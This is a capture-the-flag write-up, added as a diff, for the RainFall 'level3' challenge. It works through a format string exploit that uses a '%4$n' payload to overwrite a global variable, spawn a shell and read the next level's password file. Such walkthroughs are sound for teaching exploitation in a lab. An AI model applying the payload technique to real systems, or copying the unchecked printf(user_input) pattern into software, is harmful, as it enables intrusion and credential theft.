@@ -1,0 +1,79 @@
+# Level 3 — Format String Vulnerability (Write to Global)
+
+## Introduction
+This level introduces format string vulnerabilities. We are given a binary that reads user input via `fgets` and prints it directly using `printf` without a format specifier (e.g. `printf(buffer)` instead of `printf("%s", buffer)`). We must exploit this to modify a global variable `m` to bypass a condition check and spawn a shell.
+
+## Analysis
+The reconstructed C code of the binary is:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int m = 0; // Global variable
+
+void v(void) {
+    char local_20c[520];
+    
+    fgets(local_20c, 520, stdin);
+    printf(local_20c); // Vulnerable printf
+    
+    if (m == 0x40) { // 0x40 is 64 in decimal
+        fwrite("Wait what?!\n", 1, 12, stdout);
+        system("/bin/sh");
+    }
+}
+
+int main(void) {
+    v();
+    return 0;
+}
+```
+
+Since `fgets` limits the input size to 520 bytes, we cannot overflow the buffer on the stack to reach the global variable `m` (which is located in the data/BSS section, not on the stack). Instead, we exploit the format string vulnerability in `printf(local_20c)`.
+
+### Format String Exploit Strategy
+Using `printf`, we can use two key mechanisms:
+1. **`%n` specifier:** Writes the number of characters printed so far to the integer pointed to by the corresponding argument on the stack.
+2. **`%[pos]$` parameter selection:** Allows us to specify the exact position of the argument on the stack to use. For example, `%4$n` writes to the 4th argument on the stack.
+
+### Finding the Address of `m`
+We use `gdb` to find the memory address of the global variable `m`:
+```gdb
+(gdb) info variable m
+All variables matching regular expression "m":
+
+Non-debugging symbols:
+0x0804988c  m
+```
+The address of `m` is `0x0804988c`.
+
+### Finding the Stack Offset
+We need to determine where our input string is located relative to the stack arguments processed by `printf`. We pass a distinct marker `aaaa` followed by multiple `%x` specifiers:
+```bash
+level3@RainFall:~$ ./level3
+aaaa %x %x %x %x %x %x
+aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825
+```
+`61616161` (hex representation of `aaaa`) appears as the **4th** output. This indicates that the start of our input buffer resides at argument position **4** on the stack.
+
+### Designing the Payload
+To set `m` to `64` (decimal):
+1. Place the target address of `m` (`0x0804988c`) at the very start of our format string. This takes up 4 bytes.
+2. Print `60` additional bytes of padding (so that `4 + 60 = 64` characters are printed in total).
+3. Use `%4$n` to write the printed character count (64) to the address located at stack position 4 (which is the beginning of our string, pointing to `m`).
+
+## Exploit
+We generate the payload (reversing the target address to little-endian representation `\x8c\x98\x04\x08`):
+```bash
+python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' > /tmp/payload
+```
+
+Run the exploit:
+```bash
+(cat /tmp/payload; cat) | ./level3
+```
+
+Once the shell is spawned, we retrieve the password for `level4`:
+```bash
+cat /home/user/level4/.pass
+```
